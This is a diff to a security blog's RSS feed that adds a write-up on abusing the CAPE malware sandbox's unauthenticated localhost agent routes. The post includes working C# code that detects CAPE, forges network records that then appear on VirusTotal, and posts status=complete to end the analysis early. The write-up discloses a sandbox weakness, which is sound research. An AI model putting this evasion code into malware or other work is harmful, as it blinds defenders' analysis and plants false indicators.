@@ -5,8 +5,349 @@
     <link>https://msil.re/</link>
     <description>Reverse engineering, malware analysis, and offensive security write-ups.</description>
     <language>en</language>
-    <lastBuildDate>Wed, 20 May 2026 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 04 Jul 2026 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://msil.re/feed.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Abusing CAPE Sandbox from the Inside</title>
+      <link>https://msil.re/notes/abusing-cape-sandbox-from-the-inside.html</link>
+      <guid isPermaLink="true">https://msil.re/notes/abusing-cape-sandbox-from-the-inside.html</guid>
+      <pubDate>Sat, 04 Jul 2026 00:00:00 +0000</pubDate>
+      <category>malware-analysis</category>
+      <category>sandbox-evasion</category>
+      <category>cape</category>
+      <description>CAPE&#x27;s agent exposes unauthenticated localhost routes to the sample under analysis, enough to fingerprint the sandbox, plant bogus network IOCs on VirusTotal, and shut the whole analysis down with a single request.</description>
+      <content:encoded><![CDATA[<h2 id="what-is-cape-sandbox">What is CAPE Sandbox</h2>
+<p><a href="https://capesandbox.com/" target="_blank" rel="noopener noreferrer">CAPE</a> (Malware Configuration And Payload Extraction) is an open-source automated malware analysis sandbox, widely used by researchers and integrated into services like VirusTotal to generate behavioral reports.</p>
+<p>Part of CAPE's instrumentation logs the HTTP traffic made by the browser inside the analysis VM. To do this, CAPE loads a browser extension into the guest that forwards every request/response the browser makes back to the analyzer.</p>
+<h2 id="how-the-browser-extension-works">How the Browser Extension Works</h2>
+<p>The <a href="https://github.com/kevoreilly/CAPEv2" target="_blank" rel="noopener noreferrer">extension</a> is a small Manifest V2 add-on (deceptively named <em>"Hello Extension"</em>). Its <code>manifest.json</code> requests broad permissions, including the localhost endpoint it talks to:</p>
+<pre class="language-json"><code class="language-json">&quot;permissions&quot;: [
+  &quot;webRequest&quot;,
+  &quot;webRequestBlocking&quot;,
+  &quot;&lt;all_urls&gt;&quot;,
+  &quot;downloads&quot;,
+  &quot;http://localhost:8000/*&quot;
+]
+</code></pre>
+<p>In <code>background.js</code>, it hooks <code>webRequest</code> events, buffers each request/response into a <code>networkData</code> array, and then POSTs the whole array to the endpoint:</p>
+<pre class="language-js"><code class="language-js">function onRequestEvent(details) {
+    if (details.url.includes(&quot;/browser_extension&quot;)) {
+      return;
+    }
+
+    const requestEvent = networkData.find(entry =&gt; entry.url === details.url);
+    
+    if (requestEvent) {
+      return
+    }
+
+    const info = {
+        url: details.url,
+        method: details.method,
+        timeStamp: details.timeStamp,
+        requestHeaders: details.requestHeaders,
+    };
+    networkData.push(info);
+}
+</code></pre>
+<p>The data is sent as a <strong>multipart form</strong> with a single <code>networkData</code> field containing the JSON string:</p>
+<pre class="language-js"><code class="language-js">function sendEvents() {
+  const form = new FormData();
+  form.append(&#x27;networkData&#x27;, JSON.stringify(networkData));
+
+  fetch(&#x27;http://localhost:8000/browser_extension&#x27;, {
+    method: &#x27;POST&#x27;,
+    body: form
+  })
+  .then(response =&gt; response.json())
+  .catch(error =&gt; {
+    console.error(&#x27;Error posting data to endpoint:&#x27;, error);
+  });
+}
+</code></pre>
+<h2 id="the-http-logging-endpoint">The HTTP Logging Endpoint</h2>
+<p>The endpoint is a route on CAPE's <strong>agent</strong> (<code>agent.py</code>), which runs an HTTP server bound to <code>0.0.0.0:8000</code> inside the guest:</p>
+<pre class="language-none"><code class="language-none">http://localhost:8000/browser_extension
+</code></pre>
+<p>The handler simply takes the <code>networkData</code> form field and writes it to a temporary <code>bext_*.json</code> file that an auxiliary module later collects:</p>
+<pre class="language-python"><code class="language-python">@app.route(&quot;/browser_extension&quot;, methods=[&quot;POST&quot;])
+def do_browser_ext():
+    global AGENT_BROWSER_EXT_PATH
+    AGENT_BROWSER_LOCK.acquire()
+    if not AGENT_BROWSER_EXT_PATH:
+        try:
+            ext_tmpdir = tempfile.mkdtemp(prefix=&quot;&quot;)
+        except Exception:
+            AGENT_BROWSER_LOCK.release()
+            return json_exception(&quot;Error creating temporary directory&quot;)
+        ext_filepath = &quot;bext_&quot; + &quot;&quot;.join(random.choice(string.ascii_letters) for _ in range(11)) + &quot;.json&quot;
+        AGENT_BROWSER_EXT_PATH = os.path.join(ext_tmpdir, ext_filepath)
+    network_data = request.form.get(&quot;networkData&quot;)
+    if network_data:
+        with open(AGENT_BROWSER_EXT_PATH, &quot;w&quot;) as ext_fd:
+            ext_fd.write(network_data)
+    AGENT_BROWSER_LOCK.release()
+    return json_success(&quot;OK&quot;)
+</code></pre>
+<h2 id="detecting-cape">Detecting CAPE</h2>
+<p>Since the endpoint accepts our POST and returns a predictable response, we can fingerprint the sandbox by sending a dummy request and inspecting the reply.</p>
+<pre class="language-csharp"><code class="language-csharp">public static async Task&lt;bool&gt; DetectCape()
+{
+    using (var client = new HttpClient())
+    {
+        var multipart = new MultipartFormDataContent();
+        var json = new StringContent(&quot;{\&quot;t\&quot;:\&quot;dummy\&quot;}&quot;);
+        json.Headers.ContentType = MediaTypeHeaderValue.Parse(&quot;application/json&quot;);
+        multipart.Add(json, &quot;networkData&quot;);
+
+        try
+        {
+            HttpResponseMessage response = await client.PostAsync(&quot;http://localhost:8000/browser_extension&quot;, multipart);
+            string responseBody = await response.Content.ReadAsStringAsync();
+
+            if (responseBody.Contains(&quot;\&quot;message\&quot;: \&quot;OK\&quot;&quot;))
+            {
+                return true;
+            }
+        }
+        catch { }
+    }
+
+    return false;
+}
+</code></pre>
+<p>On success, it returns:</p>
+<pre class="language-json"><code class="language-json">{&quot;message&quot;: &quot;OK&quot;, &quot;status_code&quot;: 200}
+</code></pre>
+<h2 id="the-json-payload-format">The JSON Payload Format</h2>
+<p>The <code>networkData</code> field is a JSON array of request objects. Each object describes one HTTP request/response pair with an URL, method, timestamp, request headers, response headers, type, and the resolved ip.</p>
+<p><strong>C# Model to represent the data:</strong></p>
+<pre class="language-csharp"><code class="language-csharp">public class GenericHeader
+{
+    [JsonPropertyName(&quot;name&quot;)] public string Name { get; set; }
+    [JsonPropertyName(&quot;value&quot;)] public string Value { get; set; }
+    public GenericHeader(string name, string value) { Name = name; Value = value; }
+}
+
+public class CapeRequest
+{
+    [JsonPropertyName(&quot;url&quot;)] public string Url { get; set; } = &quot;&quot;;
+    [JsonPropertyName(&quot;method&quot;)] public string Method { get; set; } = &quot;GET&quot;;
+    [JsonPropertyName(&quot;timeStamp&quot;)] public double TimeStamp { get; set; }
+    [JsonPropertyName(&quot;requestHeaders&quot;)] public List&lt;GenericHeader&gt; RequestHeaders { get; set; } = new();
+    [JsonPropertyName(&quot;responseHeaders&quot;)] public List&lt;GenericHeader&gt; ResponseHeaders { get; set; } = new();
+    [JsonPropertyName(&quot;type&quot;)] public string Type { get; set; } = &quot;main_frame&quot;;
+    [JsonPropertyName(&quot;ip&quot;)] public string Ip { get; set; } = &quot;127.0.0.1&quot;;
+}
+</code></pre>
+<p><strong>Example of a JSON array the endpoint accepts:</strong></p>
+<pre class="language-json"><code class="language-json">[{&quot;url&quot;:&quot;https://google.com/&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;timeStamp&quot;:1746550943149.789,&quot;requestHeaders&quot;:[{&quot;name&quot;:&quot;DNT&quot;,&quot;value&quot;:&quot;1&quot;},{&quot;name&quot;:&quot;Upgrade-Insecure-Requests&quot;,&quot;value&quot;:&quot;1&quot;},{&quot;name&quot;:&quot;User-Agent&quot;,&quot;value&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;},{&quot;name&quot;:&quot;Accept&quot;,&quot;value&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;},{&quot;name&quot;:&quot;sec-ch-ua&quot;,&quot;value&quot;:&quot;\&quot;Google Chrome\&quot;;v=\&quot;135\&quot;, \&quot;Not-A.Brand\&quot;;v=\&quot;8\&quot;, \&quot;Chromium\&quot;;v=\&quot;135\&quot;&quot;},{&quot;name&quot;:&quot;sec-ch-ua-mobile&quot;,&quot;value&quot;:&quot;?0&quot;},{&quot;name&quot;:&quot;sec-ch-ua-platform&quot;,&quot;value&quot;:&quot;\&quot;Windows\&quot;&quot;}],&quot;responseHeaders&quot;:[{&quot;name&quot;:&quot;Accept-Ranges&quot;,&quot;value&quot;:&quot;bytes&quot;},{&quot;name&quot;:&quot;Content-Type&quot;,&quot;value&quot;:&quot;text/html&quot;},{&quot;name&quot;:&quot;ETag&quot;,&quot;value&quot;:&quot;\&quot;84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134\&quot;&quot;},{&quot;name&quot;:&quot;Last-Modified&quot;,&quot;value&quot;:&quot;Mon, 13 Jan 2025 20:11:20 GMT&quot;},{&quot;name&quot;:&quot;Vary&quot;,&quot;value&quot;:&quot;Accept-Encoding&quot;},{&quot;name&quot;:&quot;Content-Encoding&quot;,&quot;value&quot;:&quot;gzip&quot;},{&quot;name&quot;:&quot;Cache-Control&quot;,&quot;value&quot;:&quot;max-age=1368&quot;},{&quot;name&quot;:&quot;Date&quot;,&quot;value&quot;:&quot;Tue, 06 May 2025 17:02:23 GMT&quot;},{&quot;name&quot;:&quot;Alt-Svc&quot;,&quot;value&quot;:&quot;h3=\&quot;:443\&quot;; ma=93600,h3-29=\&quot;:443\&quot;; ma=93600,quic=\&quot;:443\&quot;; ma=93600; v=\&quot;43\&quot;&quot;},{&quot;name&quot;:&quot;Content-Length&quot;,&quot;value&quot;:&quot;648&quot;},{&quot;name&quot;:&quot;Connection&quot;,&quot;value&quot;:&quot;keep-alive&quot;},{&quot;name&quot;:&quot;X-DNS-Prefetch-Control&quot;,&quot;value&quot;:&quot;off&quot;},{&quot;name&quot;:&quot;permissions-policy&quot;,&quot;value&quot;:&quot;browsing-topics=(), run-ad-auction=(), join-ad-interest-group=(), private-state-token-redemption=(), private-state-token-issuance=(), private-aggregation=(), attribution-reporting=(), keyboard-map=(), idle-detection=(), compute-pressure=()&quot;}],&quot;type&quot;:&quot;main_frame&quot;,&quot;ip&quot;:&quot;127.0.0.1&quot;}]
+</code></pre>
+<h2 id="spoofing-network-traffic">Spoofing Network Traffic</h2>
+<p>Because the endpoint trusts anything it receives and just writes it to disk, we can craft <strong>fake</strong> request objects and POST them ourselves. CAPE will record them as if the sample made those requests.</p>
+<p>Two things to keep in mind from the extension logic:</p>
+<ul><li>The write is keyed to a single per-run <code>bext_*.json</code> file, a later POST overwrites the previous <code>networkData</code>, so send everything you want logged in one array.</li><li>The extension itself de-duplicates by URL, so use <strong>distinct URLs</strong> for each fake entry you want to appear.</li></ul>
+<pre class="language-csharp"><code class="language-csharp">public static async Task SendFakeHttpData(string data) //data is the already serialized networkData json string
+{
+    using (var client = new HttpClient())
+    {
+        var form = new MultipartFormDataContent();
+        var json = new StringContent(data);
+        json.Headers.ContentType = MediaTypeHeaderValue.Parse(&quot;application/json&quot;);
+        form.Add(json, &quot;networkData&quot;);
+
+        try
+        {
+            await client.PostAsync(&quot;http://localhost:8000/browser_extension&quot;, form);
+        }
+        catch { }
+    }
+}
+</code></pre>
+<p>Originally this was enough, the fake requests showed up in the sandbox report / VirusTotal <strong>Network Communication</strong> tab straight from that POST.</p>
+<h3 id="update-the-post-no-longer-lands-drop-the-file-instead">Update: the POST no longer lands, drop the file instead</h3>
+<p>That POST is how this worked originally. A later CAPE change seems to have broke it. The data still reaches the agent (the endpoint keeps returning <code>{&quot;message&quot;: &quot;OK&quot;, ...}</code>), but it never makes it into the report anymore. The problem is a mismatch between where the agent writes the file and where the collector looks for it.</p>
+<p>The agent writes the posted <code>networkData</code> into a fresh temp subdirectory:</p>
+<pre class="language-python"><code class="language-python">ext_tmpdir = tempfile.mkdtemp(prefix=&quot;&quot;) # for example %TEMP%\sdbdz33h (no &quot;tmp&quot; prefix)
+ext_filepath = &quot;bext_&quot; + &quot;&quot;.join(random.choice(string.ascii_letters) for _ in range(11)) + &quot;.json&quot;
+AGENT_BROWSER_EXT_PATH = os.path.join(ext_tmpdir, ext_filepath)
+</code></pre>
+<p>But the <code>browsermonitor</code> auxiliary that collects the log only accepts a <code>bext_*.json</code> either directly in <code>%TEMP%</code>, or inside a subdirectory whose name starts with <code>tmp</code>:</p>
+<pre class="language-python"><code class="language-python">if directory.startswith(&quot;bext_&quot;) and directory.endswith(&quot;.json&quot;):
+    self.browser_logfile = os.path.join(temp_dir, directory)
+    break
+...
+if not directory.startswith(&quot;tmp&quot;):
+    continue
+</code></pre>
+<p><code>mkdtemp(prefix=&quot;&quot;)</code> produces a directory that does not start with <code>tmp</code>, so the agent's file is skipped.</p>
+<p>The first branch still works. It is the location the extension's TOR path writes to directly since TOR can't reach <code>localhost</code>, so instead of posting it saves the JSON straight into <code>%TEMP%</code> through the browser download API. We can do the same thing ourselves and land the file exactly where the collector looks, skipping the agent entirely.</p>
+<h3 id="c-example">C# example</h3>
+<pre class="language-csharp"><code class="language-csharp">public class GenericHeader
+{
+    [JsonPropertyName(&quot;name&quot;)]
+    public string? Name { get; set; }
+
+    [JsonPropertyName(&quot;value&quot;)]
+    public string? Value { get; set; }
+}
+public class BrowserRequest
+{
+    [JsonPropertyName(&quot;url&quot;)]
+    public string? Url { get; set; }
+
+    [JsonPropertyName(&quot;method&quot;)]
+    public string? Method { get; set; }
+
+    [JsonPropertyName(&quot;timeStamp&quot;)]
+    public double TimeStamp { get; set; }
+
+    [JsonPropertyName(&quot;requestHeaders&quot;)]
+    public List&lt;GenericHeader&gt;? RequestHeaders { get; set; }
+
+    [JsonPropertyName(&quot;responseHeaders&quot;)]
+    public List&lt;GenericHeader&gt;? ResponseHeaders { get; set; }
+
+    [JsonPropertyName(&quot;type&quot;)]
+    public string? Type { get; set; }
+
+    [JsonPropertyName(&quot;ip&quot;)]
+    public string? Ip { get; set; }
+}
+
+private static readonly Random _random = new();
+private static readonly JsonSerializerOptions _jsonOptions = new() { Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping };
+
+private static string RandomToken(int size)
+{
+    const string letters = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+    var chars = new char[size];
+    for (var i = 0; i &lt; size; i++) chars[i] = letters[_random.Next(letters.Length)];
+    return new string(chars);
+}
+private static List&lt;string&gt; EnumerateBextFiles()
+{
+    var temp = Path.GetTempPath();
+
+    List&lt;string&gt; files = Directory.GetFiles(temp, &quot;bext_*.json&quot;).ToList();
+    foreach (var dir in Directory.GetDirectories(temp))
+    {
+        files = files.Concat(Directory.GetFiles(dir, &quot;bext_*.json&quot;)).ToList();
+    }
+    return files;
+}
+static async Task Main(string[] args)
+{
+    List&lt;BrowserRequest&gt; requests = [];
+
+    BrowserRequest request1 = new()
+    {
+        Url = &quot;https://google.com&quot;,
+        Method = &quot;GET&quot;,
+        TimeStamp = Math.Round(DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() + _random.NextDouble(), 3),
+        RequestHeaders = [],
+        ResponseHeaders = [],
+        Type = &quot;main_frame&quot;,
+        Ip = &quot;127.0.0.1&quot;
+    };
+
+    BrowserRequest request2 = new()
+    {
+        Url = &quot;https://virustotal.com&quot;,
+        Method = &quot;GET&quot;,
+        TimeStamp = Math.Round(DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() + _random.NextDouble(), 3),
+        RequestHeaders = [],
+        ResponseHeaders = [],
+        Type = &quot;main_frame&quot;,
+        Ip = &quot;127.0.0.1&quot;
+    };
+
+    requests.Add(request1);
+    requests.Add(request2);
+
+    string json = JsonSerializer.Serialize(requests, _jsonOptions);
+
+    foreach (var file in EnumerateBextFiles())
+    {
+        try 
+        {
+            File.Delete(file);
+        }
+        catch {}
+    }
+
+    var path = Path.Combine(Path.GetTempPath(), &quot;bext_&quot; + RandomToken(11) + &quot;.json&quot;);
+    File.WriteAllText(path, json);
+</code></pre>
+<p>We delete any other <code>bext_</code> files that might exist and drop ours, <code>browsermonitor</code> takes the first match it sees and uploads it when the analysis ends. With that, the same crafted <code>networkData</code> surfaces on VirusTotal again.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260704205714.png" alt="" loading="lazy"></figure>
+<h2 id="the-other-reachable-route-status">The Other Reachable Route: <code>/status</code></h2>
+<p><code>/browser_extension</code> isn't the only route left open to the guest, <code>POST /status</code> is whitelisted too, and it's way more insteresting. It's the route the CAPE host polls (<code>GET /status</code>) to track the analysis, and its <code>POST</code> handler lets the caller overwrite the reported status:</p>
+<pre class="language-python"><code class="language-python">@app.route(&quot;/status&quot;, methods=[&quot;POST&quot;])
+def put_status():
+    try:
+        status = Status(request.form.get(&quot;status&quot;))
+    except ValueError:
+        return json_error(400, &quot;No valid status has been provided&quot;)
+    
+	if status in TERMINAL_STATUSES:
+        state[&quot;async_subprocess&quot;] = None
+        
+    state[&quot;status&quot;] = status
+    state[&quot;description&quot;] = request.form.get(&quot;description&quot;)
+    return json_success(&quot;Analysis status updated&quot;)
+</code></pre>
+<p>It takes two form fields:</p>
+<div class="table-wrap"><table><thead><tr><th>field</th><th>value</th></tr></thead><tbody><tr><td><code>status</code></td><td>one of <code>init</code> / <code>running</code> / <code>complete</code> / <code>failed</code> / <code>exception</code>, or the number <code>1</code>-<code>5</code></td></tr><tr><td><code>description</code></td><td>any string</td></tr></tbody></table></div>
+<p>The interesting part is that <code>COMPLETE</code>, <code>FAILED</code>, and <code>EXCEPTION</code> are <em>terminal</em> statuses, and reporting one <strong>ends the analysis</strong>. Posting <code>status=complete</code> as the very first thing a sample does tells the host the analyzer already finished, so it stops the run before anything happens.</p>
+<p>This was confirmed in testing (on Virustotal), a sample that posts <code>status=complete</code> at the start of execution does <strong>nothing else observable</strong> on CAPE (no network requests are made or logged) while other sandboxes still record the sample's network communication.</p>
+<p>To make the fake look genuine, we mirror exactly what CAPE's own analyzer sends on a clean finish:</p>
+<pre class="language-python"><code class="language-python">success = analyzer.run() # boolean
+data = {&quot;status&quot;: &quot;complete&quot;, &quot;description&quot;: success}
+urlopen(&quot;http://127.0.0.1:8000/status&quot;, urlencode(data).encode())
+</code></pre>
+<p>Because <code>success</code> is a Python <code>bool</code> that gets url-encoded, <code>str(True)</code> becomes the literal string <code>True</code>. So a real successful completion is <code>status=complete&amp;description=True</code>. Matching that (<strong><code>description=True</code></strong>) is the most convincing "it finished normally" payload. (For reference, CAPE uses <code>status=exception</code> for real errors, with descriptions like <code>You probably submitted the job with wrong package</code> or a raw Python traceback.)</p>
+<p>The valid statuses map cleanly to a C# enum (values match CAPE's <code>Status</code>):</p>
+<pre class="language-csharp"><code class="language-csharp">public enum CapeStatus
+{
+    Init      = 1,
+    Running   = 2,
+    Complete  = 3,
+    Failed    = 4,
+    Exception = 5
+}
+
+public static async Task&lt;bool&gt; SetCapeStatus(CapeStatus status, string description = &quot;&quot;)
+{
+    using (var client = new HttpClient())
+    {
+        var form = new MultipartFormDataContent();
+        
+        form.Add(new StringContent(((int)status).ToString()), &quot;status&quot;);
+        form.Add(new StringContent(description), &quot;description&quot;);
+
+        try
+        {
+            HttpResponseMessage response = await client.PostAsync(&quot;http://localhost:8000/status&quot;, form);
+            string body = await response.Content.ReadAsStringAsync();
+
+            return body.Contains(&quot;Analysis status updated&quot;);
+        }
+        catch { }
+    }
+
+    return false;
+}
+
+// to use:
+await SetCapeStatus(CapeStatus.Complete, &quot;True&quot;);
+</code></pre>
+<h2 id="consequences">Consequences</h2>
+<p>This behavior has three consequences:</p>
+<ul><li><strong>Detection.</strong> Malware can probe <code>/browser_extension</code> (or the <code>/status</code> responses) to confirm it's inside CAPE and suppress its real behavior, degrading the quality of automated reports.</li><li><strong>Report poisoning.</strong> While not that useful, an attacker can inject misleading network indicators via <code>/browser_extension</code> framing unrelated infrastructure.</li><li><strong>Analysis kill switch.</strong> A single <code>POST /status</code> with <code>status=complete</code> at the start of execution ends the run before the sample does anything, so CAPE captures <strong>nothing</strong> (no network, no behavior).</li></ul>
+<h2 id="conclusion">Conclusion</h2>
+<p>CAPE's agent exposes two routes to the guest during analysis, <code>/browser_extension</code> and <code>/status</code>, and trusts unauthenticated input on both. That's enough to fingerprint the sandbox, inject fake network IOCs, and even end the analysis outright with a single POST.</p>]]></content:encoded>
+    </item>
     <item>
       <title>Reverse engineering Malwarebytes Browser Guard</title>
       <link>https://msil.re/posts/reversing-malwarebytes-browser-guard.html</link>
@@ -102,7 +443,7 @@ whitelist.scams.manual
 <div class="callout callout-info">
 <p>A few filters that are present but don't seem to be loaded by the engine: (<code>compromised</code>, <code>exploit</code>, <code>worm</code>, <code>whitelist.scams)</code></p>
 </div>
-<h3 id="reproducing-the-filter-in-c">Reproducing the filter in C\#</h3>
+<h3 id="reproducing-the-filter-in-c">Reproducing the filter in C#</h3>
 <p>Since all filter parameters are fully available after decompression, the lookup logic ports cleanly to any language. The following C# implementation mirrors the JS source:</p>
 <pre class="language-csharp"><code class="language-csharp">public class BloomFilter
 {
@@ -612,7 +953,7 @@ export function HUBBLE_SECRET_KEY() {
     return new TextDecoder().decode(dataBytes).slice(16);
 }
 </code></pre>
-<h3 id="a-minimal-hubble-client-in-c">A minimal Hubble client in C\#</h3>
+<h3 id="a-minimal-hubble-client-in-c">A minimal Hubble client in C#</h3>
 <pre class="language-csharp"><code class="language-csharp">using System.Net.Http.Headers;
 using System.Security.Cryptography;
 using System.Text;
@@ -1089,7 +1430,7 @@ new MutationObserver(() =&gt; KillPopup()).observe(document.documentElement, {ch
   }
 }
 </code></pre>
-<h3 id="a-minimal-client-in-c">A minimal client in C\#</h3>
+<h3 id="a-minimal-client-in-c">A minimal client in C#</h3>
 <pre class="language-csharp"><code class="language-csharp">using Newtonsoft.Json;
 
 namespace ManifestUpdaterBrowserGuard
